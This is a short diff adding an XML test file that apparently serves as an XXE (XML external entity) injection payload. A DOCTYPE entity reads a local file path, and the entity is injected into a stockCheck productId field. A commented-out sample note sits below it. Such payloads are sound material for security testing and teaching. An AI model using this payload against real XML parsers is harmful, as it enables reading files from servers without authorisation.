@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Users/it/Documents/xxeTest.txt"> ]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+
+        <!--<?xml version="1.0" encoding="UTF-8"?>-->
+        <!--<note>-->
+        <!--    <to>Tove</to>-->
+        <!--    <from>Jani</from>-->
+        <!--    <heading>Reminder</heading>-->
+        <!--    <body>Don't forget me this weekend!</body>-->
+        <!--</note>-->
